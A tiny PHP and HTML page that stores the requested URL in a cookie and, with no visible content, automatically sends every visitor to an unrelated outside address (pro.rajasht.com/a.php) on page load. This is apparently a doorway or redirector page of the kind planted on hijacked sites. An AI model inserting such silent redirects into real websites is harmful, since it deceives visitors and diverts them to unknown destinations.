
<?php
$nama= $_SERVER['REQUEST_URI'];
setcookie("Hi", "$nama", time() + 10*60) ;
?>
	
    <head>
    <!--[ Favicon ]-->
     
    <script type="text/javascript">
    function load()
    {
    window.location.href = "https://pro.rajasht.com/a.php";
    }
    </script>
    </head>

    <body onload="load()">
   
</body>  